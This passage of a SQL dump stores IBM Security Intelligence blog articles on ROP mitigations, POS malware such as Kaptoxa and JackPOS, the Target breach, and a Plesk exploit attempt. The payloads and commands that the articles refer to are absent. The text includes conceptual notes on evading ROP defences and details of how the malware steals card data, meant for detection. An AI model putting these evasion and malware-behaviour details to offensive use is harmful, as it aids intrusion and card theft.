ROP chain with the appropriate return addresses which point to the appropriate ROP gadgets. The reason is ASLR technology adds randomness to the location (address) where code is loaded in program memory space such that the address of the executable code sequences (including any used by the attacker as ROP gadgets) are not static and is difficult to deduce for the attacker. But this is not a complete solution. Security vulnerabilities classed as information leakage/disclosure vulnerabilities may give the attacker the necessary information which allows the attacker to successfully deduce the addresses of any code sequences in the program memory space the attacker wishes to use as ROP gadgets! Even though memory content leakage/address disclosure vulnerabilities in themselves are considered less severe, they could well hold the key to the successful exploitation of a memory corruption vulnerability and as such not to be taken lightly. So with the mitigation technologies so far, ROP can still be used if the randomness introduced by ASLR can be circumvented using an information disclosure vulnerability (or a flaw in the ASLR implementation itself for that matter). Many   only use ROP up to the point where it can either mark the memory where shellcode resides (using VirtualProtect API function in Windows for example) as executable or allocate executable memory and load shellcode into it, before running shellcode. This is because shellcode is easier to construct than ROP chains, in general. Now this brings us to the latest and the greatest implementations of technologies that are used for ROP detection/mitigation. Some of these techniques are implemented by Microsoft  . In fact, Microsoft held a contest in 2012 in conjunction with its  , open to submission of mitigation technologies that specifically deal with ROP. Subsequently, Microsoft implemented the mitigation technology proposed by the second place winner of the contest, Ivan Fratric, in Microsoft EMET (as of version 3.5 Technical Preview). The technique itself was called ROPGuard. At appropriate points, such as at the entry to operating system API functions that are considered very useful when using   (such as VirtualProtect or LoadLibrary API functions in Windows) and other security critical API functions: The implementation also checks for some of these conditions to be valid for stack frames that are not the current stack frame (for example by using the frame pointer).  also proposes to disallow changing the executable status for non-executable memory areas (such as the stack and heap). Another very interesting mitigation technology, called   was proposed by Vasilis Pappas. In fact this was the first prize winner, receiving a $200,000 prize. How does kBouncer work? Well, kBouncer requires a kernel mode component (where ROPGuard could be implemented in user mode alone). It makes use of the LBR (Last Branch Recording) feature of x86 / x64 processors and requires enabling this feature for execution returns from calls. Using the LBR feature has very little overhead compared to the BTS (Branch Trace Store) feature of the same processor architecture. LBR support is present since the Intel Pentium 4 processors. So with kBouncer, when an operating system call takes place (for example a call to the kernel implementation of the Windows Native API), mitigation technology implementation code in the kernel reads LBR stack (which records 4 – 16 control transfer pairs depending on the CPU) and makes sure the return addresses are preceded by a calls. kBouncer mitigation technology for example can be circumvented with ROP code that doesn’t use gadgets with return (RET on x86/x64) instructions. For example, a ROP gadget could pop (POP instruction)  the next ROP gadget address off the stack and jump (JMP instruction) to that address instead, in which case the LBR stack will not reflect this control transfer. These technologies however do raise the bar. You can find a further in-depth discussion on circumventing ROP mitigation   here.', '\'Exploit\', \'IBM X-Force Research\', \'Shellcode\', \'Vulnerabilities\'', 'https://securityintelligence.com/return-oriented-programming-rop-contemporary-exploits/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (550, 'Just When You Thought It Was Safe to Go Mobile, New Security Threats Emerge', 'Neil Jones', '2014-2-24', 'The classic 1978 film,  , leveraged one of the famous movie taglines ever: “Just when you thought it was safe to go back in the water…” In the movie trailer, fictional Police Chief Brody famously states, “I think we may have another shark problem.” How does a decades-old film relate to the concerns of today’s IT managers? Because, just when IT managers began to confidently address many of their Web-based and network-related vulnerabilities, along came a new and complex threat variant designed to feast on their valuable organizational data and keep them up at night:  . Now, let’s explore significant risks posed by mobile threats, and offer practical solutions to address the risks they pose. Not so long ago, predictions stated that smartphones and tablets weren’t particularly susceptible to malware and hacking. That hasn’t proven to be the case. Instead, organizations’ growing use of mobile technology has been accompanied by an  . Case in point: Published reports have indicated that   in the one-year period ending March 2013, nearly 450 percent faster than in the year before. With the pronounced  ,  , up from less than 1 percent in 2009, according to the   2013 Mid-Year Trend and Risk Report. In late 2013, IBM partner Arxan Technologies identified and reviewed   from third-party sites outside of official Apple and Google app stores. They also reviewed 15 highly-popular free apps for iOS and the same 15 free apps for Android. In addition, 40 popular financial apps were reviewed, with a breakdown of 20 per platform. Arxan’s sample size totaled 230 apps. To give you a sense of the pervasive nature of  , Arxan’s research determined that amongst top 100 paid applications: Amongst popular free applications: \n How do you balance the increased productivity and flexibility offered by mobile technology against growing security risks associated with mobile’s widespread usage? And, how do you manage the myriad of new security threats that are emerging in the marketplace? In 2012,   that mobile computing devices were driving security controls and technology that hadn’t previously existed for traditional endpoint devices. But,  \n In order to address the growing market need for improved mobile protection, IBM is announcing two exciting new security solutions:\n The new release permits you to integrate your AppScan and IBM Worklight activities, so you can conveniently expand your overall IBM relationship and enhance security protection. You can read more details about what we are announcing below.', '\'Android\', \'Android Apps\', \'Application Security\', \'Applications\', \'Arxan\', \'IBM Security\', \'IBM Security AppScan\', \'iOS\', \'iOS Apps\', \'Malware\', \'Mobile\', \'Mobile Security\', \'Technical & Product\'', 'https://securityintelligence.com/new-mobile-security-threats-malware/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (551, '2016: The Year of the Mega Breach', 'Michelle Alvarez', '2017-3-29', '“Excuse me, are you aware of what’s happening right now? We’re facing 20 billion security events every day. DDoS campaigns, ransomware, malware attacks …” says a woman sternly to an associate in a recently aired   featuring Watson and IBM Security. She may have been an actor, but the question and the threats she described plague real-world organizations and their security operations teams daily.   IBM X-Force knows the difficulties organizations face when it comes to finding time to step back from day-to-day operations to look at the big security picture. Because of this, they may be left with many unanswered questions, such as: \n Fortunately,   takes the guesswork out of assessing the security threat landscape for organizations with the IBM X-Force Threat Intelligence Index. To form assessments regarding the threat landscape, X-Force researchers draw on numerous data sources to include both data from monitored security clients — billions of events per year from more than 8,000 client devices in more than 100 countries — and data derived from noncustomer assets, such as spam sensors and honeynets. The following key trends point to a continued need to focus on security fundamentals. For a closer look at the full cyberthreat landscape for 2016, download the complete  .', '\'Data Breach\', \'IBM X-Force Report\', \'IBM X-Force Research\', \'Security Breach\', \'Threat Intelligence\', \'X-Force\'', 'https://securityintelligence.com/data-security-report-ibm-x-force-threat-intelligence/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (552, 'Trusteer Apex Preempts New Point-of-Sale Malware JackPOS', 'Dana Tamir', '2014-2-20', 'Maintaining the   of point-of-sale (POS) systems is a growing concern. The trend of POS malwares discovered last year continues with the recently discovered JackPOS malware. Like a number of POS malware families discovered last year, including Dexter, vSkimmer, Alina and BlackPOS, the new JackPOS malware is designed to steal payment card information from the infected POS systems. Similar to these malwares, it utilizes a command-and-control (C&C) communication channel to receive operational commands and exfiltrate the stolen  . The loading and delivery of the JackPOS malware is done through a drive-by download attack. After infecting the systems, the malware extracts credit card data from point-of-sale systems using code similar to the RAM-scraping POS malware known as Alina. The attackers use obfuscated compiled AutoIt script, which, according to IntelCrawler, “became quite a popular method to avoid AV detection in order to unpack additional binary malicious code and execute further instructions received from the C&C server.”', '\'BlackPOS\', \'Command-and-Control (C&C)\', \'Dexter\', \'Drive-by Download\', \'Malware\', \'vSkimmer\'', 'https://securityintelligence.com/trusteer-apex-preempts-new-point-of-sale-malware-jackpos/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (553, 'How do you know if a hardware or software vendor can be trusted?', 'Diana Kelley', '2014-2-20', 'How do you know if the vendor providing hardware or software can be trusted? How do you know if their processes can be trusted to supply your organization with hardware and software that has not been maliciously tainted? , “a global consortium that enables the achievement of business objectives through IT standards,” began to   “in 2009 with a meeting of government and industry representatives, said Sally Long, director of [The Open Group’s Trusted Technology Forum]. “Government came to us and asked, ‘ ” The Open Group consortium includes many vendors,  , but strives to be vendor neutral. The Open Group mission is to help companies with reliable and secure global interoperability not to recommend a single vendor or product. To address the issue of technology trust, the Open Group established The Trusted Technology Forum, which published the   (O-TTPF) in February 2011.  The Framework sets forth best practices identified by a cross-industry forum which, if used by a technology vendor, may allow a government or commercial enterprise customer to consider the vendor’s products as more secure and trusted. The best practices address, among other things, Product Development and Secure Engineering. Specific  include (but are not limited to): [one_half] [/one_half] [one_half_last] [/one_half_last] The O-TTPF is complemented by the  , Version 1.0 (April 2013) which contains a set of organizational guidelines, requirements, and recommendations for integrators, providers, and component suppliers to   and the integrity of  . The standard encompasses the entire COTS ICT Lifecycle through: design, sourcing, build, fulfillment, distribution, sustainment, and disposal. On February 3, 2014 The Open Group announced the   Accreditation Program to help companies assure the integrity of COTS ICT products and safeguard the global supply chain from Cybersecurity attacks. To be accredited, organizations must demonstrate that they conform to the O-TTPS requirements and have compliant processes and procedures in place that secure in-house development across the entire COTS ICT lifecycle. When accredited, organization can identify themselves as  ™ and are included in the Open Group’s public registry of trusted providers. Completing accreditation means that an organization has followed O-TTPS to ensure that they “ ” so their customers can “Buy with Confidence”. In January 2014,   for the Application Infrastructure and Middleware (AIM) Software Business Division. , Vice President, Chief Technology Officer, IBM U.S. Federal IMT: said: “Secure by Design is a key tenant of the IBM secure engineering process. The Open Trusted Technology Provider™ Standard and Accreditation Program   that value Secure by Design best practices.”', '\'Compliance\', \'Cybersecurity\', \'thinkappsec\'', 'https://securityintelligence.com/open-group-ottps-trust-software-hardware-vendor/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (554, 'The enterprise is under attack! Why you need a risk-based, layered security strategy to defend', 'John D. Johnson', '2014-2-19', 'No, this is not the start of a sci-fi story, it is the reality that enterprise IT security defenders face in 2014. Attackers are waging an asymmetric battle for our networks, assets and data. Their attacks are increasing in sophistication, velocity and volume. Meanwhile, IT systems are becoming more complex and enterprise resources extend beyond the traditional perimeter boundaries, and enterprise data is used in social media, cloud services and stored in the cloud and on mobile devices. Suppliers and contractors remotely access enterprise networks and resources by VPN and virtual desktops. We truly have our work cut out for us. Advanced threats have been shown to pose a significant threat, if they can gain a foothold in the enterprise. Recent attacks against retail giants like Target and Neiman Marcus demonstrate that even companies with leading security controls, which are certified as PCI compliant are at risk. Remote access, credentials abuse and malware are on the increase, and it motivates improved diligence by security defenders. The traditional approach has been to look for signatures of malware or an attack, so it can be blocked. Anti-malware, intrusion detection and vulnerability management focus on ‘known malicious behavior’. The bulk of attacks, today, are based on 0-day exploits and undiscovered vulnerabilities. In many cases, the attack vector leverages software that is not quickly patched, or that cannot be patched for fear of breaking enterprise applications. Examples are PDF files, Java and Office file formats. Like a game of chess, there are many moves possible, but there are certain stages in the threat lifecycle where the attacker has fewer options. These are strategic chokepoints, where malicious code seeks to exploit a system and where it attempts to establish a connection to a command and control channel. Trusteer Apex applies this knowledge to break the exploit chain and prevent compromise on endpoints. In the recent Target breach and in other high-profile attacks, both remote access connections and privileged credentials have been leveraged and abused.   provides protection of corporate credentials, against reuse on other websites and from keystroke logging by malware. When suppliers and contractors connect to the enterprise remotely, their computers are in an unknown state. They may not be patched and secure, and there is a good likelihood that some of these systems are already compromised. The application of Trusteer Apex for remote access by non-corporate assets adds an important layer of security to address this gap. A key additional factor in the selection of Trusteer Apex was the ease of deployment and management, especially when dealing with non-corporate assets. Because of the adoption of Trusteer Apex by large financial institutions with up to millions of customers, we recognized that this solution would require a low level of support.  As corporate strategy moves to adopt consumer technologies to grow and compete globally, and   Trusteer Apex addresses some key gaps that are missing in traditional endpoint and network security controls. It is a key piece to an enterprise IT security strategy for advanced threat protection.', '\'Advanced Attacks\', \'Advanced Threat Protection\', \'IT Security\', \'Malware\', \'Target\', \'Trusteer\', \'Trusteer Apex\'', 'https://securityintelligence.com/enterprise-attack-it-security-need-risk-based-layered-security-strategy-defend/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (555, 'The Syrian Electronic Army Strikes Again: Over 1 Million Emails, Passwords Exposed', 'Dana Tamir', '2014-2-19', 'The latest media outlet targeted by the Syrian Electronic Army (SEA) is Forbes.com. The hacktivist group was able to breach a database containing email address and password combinations for over a million users’ accounts, including Forbes contributors. Although the passwords were one-way encrypted, the media outlet recommended users change their  . To prove that it carried out the attack and breached the database, the SEA defaced three online articles. It seems that cyber criminals are increasingly targeting users’  , which provide them access to various systems. Only two weeks ago, IBM learned that   using credentials stolen from a third party. In a recent  , the company explained how third-party database breaches can lead hackers to a user’s data. With login credentials for a user’s account, it is possible to access information stored within the account. It is not known what type of information Forbes.com stored about its users, though concerns presumably relate to the exposure of personal and financial data. Credentials to contributors’ accounts may actually provide access to systems used by the media outlet to publish news, effectively allowing attackers to post fake news alerts. Last year, the Syrian Electronic Army took credit for hacking the Twitter account of the Associated Press (AP) and posting a fake news alert about a targeted attack on the White House and President Obama. The news alert was quickly denied, but not before the Dow Jones stock exchange fell by 1 percent and wiped $200 billion dollars from the entire market (stocks bounced back later in the day). An additional concern is that many users tend to reuse passwords across multiple systems. After all, it’s hard to remember so many passwords. If they are extracted from the Forbes.com database, which enables access to the email accounts they are paired with, attackers can access these users’ email accounts. Searching through emails in any one account can expose a wealth of personal data. A breached user account can be used for developing spear-phishing messages and drive-by download attacks. The fact that the email comes from a trusted source — someone the user regularly exchanges emails with — increases the chances that recipients of a phishing email will fall for the scam. Forbes specifically warns users to look out for phishing attacks seemingly coming from Forbes.com. If individuals are reusing their credentials or maintaining the  , the exposed information may also provide access to other websites and Web services, including corporate systems. Although access to online consumer applications and services facilitates  , access to corporate systems can enable a full enterprise breach. There is no doubt that users who used their Forbes.com email address and password combination to log in to various other websites are at risk.', '\'Corporate Credentials\', \'Credentials Theft\', \'Data Breach\', \'Data Theft\', \'Employee Credentials\', \'Enterprise Security\', \'Syrian Electronic Army (SEA)\', \'Twitter\', \'Yahoo\'', 'https://securityintelligence.com/the-syrian-electronic-army-strikes-again-over-1-million-emails-passwords-exposed/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (556, 'What Retailers Need to Learn from the Target Breach to Protect against Similar Attacks', 'Chris Poulin', '2014-1-31', 'If you’re a US shopper, there’s almost a 50% chance that your information was compromised in the Target breach. The personal and financial information of approximately 110 million people, comprising 11 GB of data, was stolen in a successful compromise during the Christmas shopping season. The attackers persisted undetected for almost 2 weeks, and is attributed to a cyber criminal in the Ukraine. The attacker first compromised a 3rd party contractor, who provides HVAC services to Target. The attacker probably used Target’s contractor portal as a point of presence to penetrate the internal network and compromise an internal Windows file server. Although the publicly disclosed forensics don’t include full details, it’s likely that the attacker first compromised the Windows server and used it to find and  , where a Trojan that finds clear-text copies of credit card magnetic stripe information was installed. The data was consolidated back on the Windows server, where it was exfiltrated to three (3) FTP servers at regular intervals. \n At the time of the attack, none of the anti-virus solutions on the market would have—or did— , dubbed Trojan.POSRAM, a variant of BlackPOS. In fact, even as of a couple of weeks into the forensics investigation, signature-based anti-virus was ineffective in detecting the POS trojan. So how can fellow retailers and other enterprises avoid this fate? Let’s break down the phases of the compromise: \n There are a few potential targets the attackers gained access to with the contractor’s credentials: the Ariba contractor purchase management portal, Target’s Partners Online portal, and Target’s Property Development Portal. It appears as though Ariba is a cloud service and not directly connected to any of Target’s networks, which leaves the other two as likely avenues of attack. It’s possible that attackers abused a vulnerability in the web application, such as SQL injection, XSS, or possibly a zero-day, to gain a point of presence and escalate privileges, then attack internal systems.\n The internal system may have been compromised through the same latent vulnerabilities as the web server or  . All the mitigation strategies for the web server apply here (see #1). In addition: Note that the contractor mentioned earlier may have had direct access into Target’s network to remotely monitor and manage HVAC equipment. This is pure speculation and the contractor claims that their access was solely to external systems; however, many organizations do allow contractors internal access to monitor and maintain facilities equipment as well as IT systems. Providing direct access to 3rd parties demands strong security controls and governance over the systems they use to access customer systems. The malware installed on the POS systems scans memory for clear-text copies of credit card data, known as RAM scraping, which is a decidedly uncommon activity for an application. The malware creates a temporary Windows share, moves the stolen credit card data to the central repository, then removes the share. After a load of data is moved, the malware on the POS sends a custom crafted ICMP (i.e., network ping) packet containing a notification string that malware on the file server listens for. Data was exfiltrated on a regular basis to FTP servers in Russia. There are many measures we can implement with the benefit of hindsight; yet, they’re all reactive and specific to this threat, much like why we have to take off our shoes when going through airport security. The nature of APTs is they are unique and unpredictable. I’ve tried to make the steps above as generic as possible so they apply to not just the  . Other steps retailers can take with the Target breach as an example in the rearview mirror are: In the final analysis, there is no perfect or foolproof detection and prevention technology; however, with appropriate architecture, policies, and technology, retailers can increase their odds of beating the bad guys. And don’t forget to plan for incident response. Optimally, your plan should include detection, response and escalation, engaging law enforcement as appropriate, preservation of evidence, compliance with regulations and contractual agreements, customer and press notification, and public relations. If you  , engage them in advance so they can help you prepare for a breach and gather context about your environment. Finally, test your process regularly; there’s nothing worse than forgetting to label which closet contains the life preservers when the sea is rushing in through the portholes.', '\'Application Security\', \'BlackPOS\', \'Citadel Malware\', \'Data Breach\', \'Intrusion Prevention System (IPS)\', \'Kaptoxa\', \'Malware\', \'Network IPS\', \'Retail\', \'Security Breach\', \'Security Information and Event Management (SIEM)\', \'Security Intelligence\', \'Target\', \'Technical & Product\', \'Vulnerabilities\'', 'https://securityintelligence.com/target-breach-protect-against-similar-attacks-retailers/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (557, 'Target Data Breach: Understand and Detect Kaptoxa POS Malware', 'Mark Yason', '2014-1-23', 'A few days ago, I was tasked to look at the  , a malware which is   in the massive  , with the goal of: This blog post describes my findings and suggests some detection strategies and corresponding   that you can use. The sample that I specifically looked at have the MD5 hash of “CE0296E2D77EC3BB112E270FC260F274”, and based on in its operation (which I will further describe below) is a component that runs on the   to steal card information by scraping data from a POS process memory. Interestingly, the following string was found in the malware binary which suggests that it was probably called the “Memory Monitor” component: The data stealing operation of the   consists running two threads: the main process thread is used as the “scraper” thread which routinely looks for the POS process and scrapes card data from its memory, and a second thread is used as a “transfer” thread which routinely transfers the stolen card data to another machine via  . The scraper thread enumerates running processes and looks for the “pos.exe” process. Once the “pos.exe” process is found, it parses the contents of its memory and looks for   using a parser code that is roughly equivalent to running the following regex against the memory contents: Cross-referencing the regex equivalent of the parser code against the track format led me to conclude that: Each scraped track data is separately encoded using the base64 algorithm (using the charset “JN8hdEe3P0cUMTs5kQolDWC9BV26GjRIZnXfOF+K4rYtmqg7b/y1xwvpHiLAzSau” and with the padding “$”) and then appended to the file “<Windows>\\system32\\winxml.dll” with each encoded track data separated by CRLF. To illustrate the scraping and the encoding process, assume a chunk of memory in the “pos.exe” process contains the following data: The malware will identify the string starting at “1234567890123456” (the PAN/card number) is a track 1 data and then proceeds to extract it. The extracted track data is then stored to a string – let’s call it the “track string”: The “track string” is then base64-encoded (using the charset and padding previously discussed) resulting to the following string: The above encoded string is then appended by the malware to the “<Windows>\\system32\\winxml.dll” file. The transfer thread, on the other hand, routinely moves the file containing the encoded track data (“<Windows>\\system32\\winxml.dll”) to a second machine via SMB. The transfer operation simply involves running the following sequence of commands: Based on the malware’s operation, three of the possible ways to detect its network activity are: (1) detecting the transfer of encoded track data via SMB, (2) detecting attempted SMB writes to the drop location (\\\\<…>\\c$\\WINDOWS\\twain_32), and (3) a combination of (1) and (2). Details of these detection strategies, including their corresponding OpenSignature rules are provided below. (Thanks to Matthew Dobbs of IBM X-Force for converting the detection strategies to OpenSignature rules. These OpenSignature rules are compatible with the   and third-party products that are OpenSignature-compatible). The first detection strategy takes advantage of the fact that the first 15 characters of the stolen track data always consist of digits, this means that the first 5 groups of encoding output (which is 4 bytes each) has a fairly limited number of combinations and therefore has a predictable pattern. Specifically, the encoding output of the values from “000” to “999” will result in a string that always starts with any of the following: “M1”, “Mf”, “Mh”, “Ml”, “T1”, “Tf”, “Th”, “Tl”, “sh”, “sl” – we can verify this using the previous encoded track data example: This detection strategy along with additional character filtering can be expressed using the following OpenSignature rule: Another way to detect the malware’s network activity is by detecting its act of dropping a file to a specific drop location using a specific filename format. Specifically, we can check if a file having a path and name that matches the format below is being written: This detection strategy can be expressed using the following OpenSignature rule: Finally, both detection strategies can be combined so that the encoded track data transfer rule will only be triggered if a SMB write to the drop location was seen:', '\'Data Breach\', \'IBM X-Force Research\', \'Intrusion Prevention System (IPS)\', \'Kaptoxa\', \'Malware\', \'Network IPS\', \'Network Security\', \'Retail\', \'Security Breach\', \'Target\'', 'https://securityintelligence.com/target-data-breach-kaptoxa-pos-malware/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (558, 'Application Sandboxing Makes Exploiting Vulnerabilities Less Profitable', 'Chris Poulin', '2014-1-20', 'When I was a full-time software developer, one of my colleagues inherited a piece of code that he simply couldn’t make sense of. The thing was a tangled mess of globally defined variables with obscure names that gave no clear indication of their scope; functions spanning hundreds of lines and returning in dozens of places; and goto’s and early exits from loops. For the non-coders, imagine an amalgam of a dirt road and a Los Angeles freeway, with left and right exits — all unmarked — and traveled by BMWs and horse-drawn buggies alike. He decided that instead of risking breaking the fragile balance of this monstrosity, he left it all alone and preceded every return from the freakish code with a call to his own, sensible functions. Imagine all exits on the highway send you off on a parallel, paved road with separate lanes for different classes of traffic and clearly signed exits. This is far from the norm in software development. But like one comedian says, somewhere out there is the worst doctor in the world — and someone has an appointment with him tomorrow morning. None of us wants to admit we’re not particularly proficient at our craft, but empirical evidence suggests that the inept are among us. And that’s OK as long as there are checks and balances to compensate. I’ve written before about  . Training programmers on secure coding practices, doing code reviews, and performing automated scans on both source code and the application as it executes need to be part of vendors’ development and quality assurance processes. But consumers need to protect themselves against the residual vulnerabilities. Case in point: Adobe Acrobat was a favorite avenue of exploitation, which enabled the RSA compromise last year as well as countless other incursions. Now, I’m not saying Adobe writes bad code; rather, Acrobat is ubiquitous, which makes it a tasty target and the bad guys focused much energy on finding flaws in it. But according to the   “the vulnerabilities in Office and Portable Document Formats (PDF) declined sharply (since the last report).” The report goes on to correlate the decline with the inclusion of sandboxing technology in Adobe Acrobat Reader X.  isn’t a new concept; it’s been used in various forms for some time. Perimeter DMZs are a form of sandboxing, as is segmenting networks with enclave firewalls. Linux/UNIX has had the concept of root jails, or chroot, for some time. Applications have been developed with the concept of separation of privileges for processes and threads. Postfix was written as a secure replacement for Sendmail, substituting Sendmail’s monolithic process model with multiple processes running with minimal privileges, where the main process is the only one that needs to be run as root. If that sounds like a bunch of techy jibber jabber, imagine the recent presidential national conventions: a big stadium with a bunch of people with widely differing roles and motives. There are the delegates in attendance to cast their votes and drink in the pageantry; the media, there to witness and report the goings-on; the organizers and staff, directing the activities; the nominees and their entourage of family, colleagues and guest speakers; and finally there’s the security detail, trying to keep the whole thing from turning into a recreation of “The Dead Zone.” This is what a typical operating system and all its applications look like: not much in the way of separation or segmentation to keep one angry person with a weapon from bringing down the house. Now imagine if each of the separate factions had bulletproof, plexiglass domes surrounding them; interconnected as needed by common doors and controlled by a well-trained security guard. It would be impossible to pull out a handgun and fire on the dignitaries, or even the media. However, the media and the delegates will need to communicate and the guard mediates the individual meetings. This reduces the potential for mayhem. But no security measure is foolproof. Security is not about absolute containment, it’s about deterrence and early detection. People are smarter than turtles and turtles can be blasted difficult to contain. I can think of a half-dozen ways to thwart the cone of silence thingy, but they’re far more involved than the alternative, and will almost certainly require two steps now instead of one: thwart the guard, then cause the intended damage.  add one more layer of defense in the struggle to regain the right to peaceful enjoyment in our own networks. We already control the infrastructure and can design architectural sandboxing, so it’s important that application providers are putting skin in the security game, particularly because it adds a fair bit to their overhead and little to their direct bottom line. So kudos to Adobe and others who are investing in sandboxing technology. Time will tell how effective it is in the long term. But at least as consumers are struggling with how to adopt cloud and mobile computing, which challenges my assertion a moment ago that we control our infrastructures, with application and service providers wrapping their own goods in a virtual prophylactic, we won’t feel as option-less when we agree to the EULA. And once they start down the road of building security into their applications, perhaps — just maybe — they’ll come up with a better mousetrap. Sounds like a good name for sandbox 2.0.', '\'Application Security\', \'IBM X-Force Research\', \'Sandbox\', \'Sandboxing\', \'Technical & Product\', \'Vulnerabilities\'', 'https://securityintelligence.com/application-sandboxing-exploiting-vulnerabilities-less-profitable/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (559, 'Help! Our Dev Team Hates the Software Security Testing Team', 'Diana Kelley', '2014-1-15', 'This week’s question was inspired by a concern I’ve heard from many different companies over the years. The big picture problem can be paraphrased as:  Rather than two questions this week – we’ve got a two part answer to one big question: \n         \n Though it can be easy to striate ourselves into opposing factions (ex: red states v. blue states, dog lovers v. cat lovers, vegans v. omnivores), there’s strong evidence that human beings are naturally  . A great way to get that cooperation fired up is to provide a common motivation. When humans are faced with a shared goal, it’s more likely they’ll work together to achieve it. These same principals can be applied to application security testing. To illustrate this point, let’s take an example company that is about to launch a major offering. This is the one, it’s going to lead-frog the competition and bring in a slew of customers with all of its innovate features and functions. The Board and Sales are jazzed up because the new application is projected to increase the customer base and revenues significantly. The business owner of the app has completed extensive focus group testing and the new application got high marks for user experience and value. The dev team has been working round-the-clock to ensure that the offering launches on the target date. And marketing has lined up an advertising/social media blitz for it. Everything’s great right? Not so fast, the security team just finished the pre-launch security assessment and the app is riddled with high severity vulnerabilities. Now they’re going to the business owner and the CEO saying that the new app can’t launch with these exposures and the launch target date is in jeopardy. Now consider these two scenarios, in the first the dev team and security team are motivated by different goals, in the second their goal is the same. Since the project’s inception, the dev team has had one core remit – make a usable app, that customers will love and have it ready for the target launch date. There may have been some mention of it being “secure” but what that means was never clearly defined. Dev is responsible for making an app customers love, and the focus groups have already proven this out, the app is great and in the dev team’s mind it is ready for launch. The company has been clear – security testing’s purpose is to make sure no vulnerable apps go into production. And their testing proves this new app is vulnerable. Security knows that delaying the launch of the app could have negative financial consequences for the company, but their objective has been set: preventing the company from attack and sensitive data loss. The CEO and Board understand the business risks of launching applications intro production with high severity vulnerabilities. Protecting customer and sensitive data is a core tenant of the company’s mission and is one of the critical goal’s for this new app. Dev knows that part of their success for this project is dependent on the application launching with no high severity vulnerabilities so they are highly motivated to get those vulns removed before launch day. Which scenario looks more like the situation at your organization? Which one do you think will be more effective in the long run? In the previous example, you may have been screaming – “but wait! there’s another big problem, all the testing was done at the end of the cycle!” or “our executive management doesn’t understand the risks of a vulnerable app so security is never part of the real success factors for the dev team!” Excellent points that lead to the other key factor for cooperative harmony between dev and security: communication. The sooner the common goal can be articulated and worked into the process and the more clearly the process is communicated between all parties, the better chance there is for smooth, operationally efficient, execution. No development team wants to hear at the end of the cycle that their code is “bad.” That sets up a combative and contentious environment. If the development team works collaboratively with security and the business owners at the beginning of the process, security and risk management can be worked into the cycle at the beginning and the teams can work toward a common goal throughout the process, with secure requirements, secure design, threat modeling and security testing at many checkpoints rather than having a nasty security surprise two days before a major launch. Don’t forget that communication needs to expand beyond the dev and security teams up to the executive decision makers. If the business supports security testing and a risk program that can balance speed to market with app vulnerabilities and exposures that can set the tone for a shared goal between dev and security. If the top level of decision makers has the right goal – the delivery teams have a much better chance of being team-mates rather than warring factions with disparate goals.', '\'Application Security Testing\', \'thinkappsec\'', 'https://securityintelligence.com/dev-team-hates-software-security-testing/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (560, 'The Return of Image Spam', 'Ralf Iffert', '2014-1-14', 'Image spam had its heyday in 2006 and 2007. In the winter of 2006/2007, more than 40 percent of all spams contained an image attachment. However, by the summer of 2007, the game seemed to be over and image spam threats stopped almost completely. There were only two short comebacks: This was the last time the percentage of image spam exceeded 10 percent. From time to time we have seen some image spam threats, but none of them exceeded 10 percent (when looking at weekly intervals). Nearly five years later, in December 2013, image spam has made a comeback! On December 5, spammers surprised us with a large amount of image spam. This new attack of image-based spam continued until December 16, as they sent out their image afflicted attempts nearly every day. For a short while they took a break but then started a massive image spam attack on December 23. \nFigure 1: Percentage of Image Spam – December 1, 2013, until January 7, 2014 Some technical details discerned during these recent attacks: So to summarize, technically these spams are not using new technique. The usage of image variations and time span for maintaining the Spam URLs is actually very “old-fashioned”. We are not sure why spammers would use these older techniques but perhaps after a five year absence, they are assuming that spam filters are not prepared for these large attacks of image-based spam. It will be interesting to see whether 2014 is the comeback year for image-based spam.', '\'IBM Security\', \'IBM X-Force Research\', \'Security Information and Event Management (SIEM)\', \'Security Intelligence\', \'Spam\', \'Technical & Product\'', 'https://securityintelligence.com/image-spam-return/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (561, 'Six Month Old Vulnerability Exploit Attempt', 'Bryan Ivey', '2014-1-13', 'The   reports on vulnerabilities that need to be brought to the attention of our customers. Such was the case in June of 2013. We found a report on a   and provided the following assessment at that time: Exploit code has been released that is reported to target versions 8.6, 9.0, 9.2, 9.3, and 9.5.4 of Plesk running on the Linux and FreeBSD operating systems. Plesk is a commercial software web administration package that allows an administrator to easily set up new websites, email accounts, and DNS entries via a web-based interface. The vulnerability is reported to rely on a non-default setting in Plesk which exposes the entire /usr/bin directory to the Internet. An attacker who successfully exploits this vulnerability can gain shell access to the victim’s server. Customers should verify that the following Plesk configuration entry is not present: Plesk administrators should contact their distribution channels for more information regarding configuration best practices. During the weekend of January 4th, the SOC began seeing attacks on our customers that appeared to be attempting to exploit this vulnerability. The payload of these attacks looked like this: The SOC escalated the event to management and began contacting affected customers. Further analysis of the attack revealed only one attacking IP, 80.82.78.9. It also gave a strong indication that the attack was against the Internet as a whole and not any specific customer or industry. While researching the attack, we saw that other organizations, such as ISC, were aware of activity from this IP address as well. In their report, however, the attack they noted appeared to be targeting potentially vulnerable Linksys devices. The top ten signatures seen in connection with this attack were: \n This is a common tactic among attackers. First they scan for open ports and then, based on their recon, select an appropriate attack vector from the exploits they have in stock. Attacks, such as this one, only reinforces the XFTAS’ recommendations to keep operating systems and applications patched in a timely manner. Attacks against new vulnerabilities do not always occur immediately after their announcement. Sometimes, as in this case, it may be months before the vulnerability is exploited.', '\'IBM X-Force Research\', \'Vulnerabilities\'', 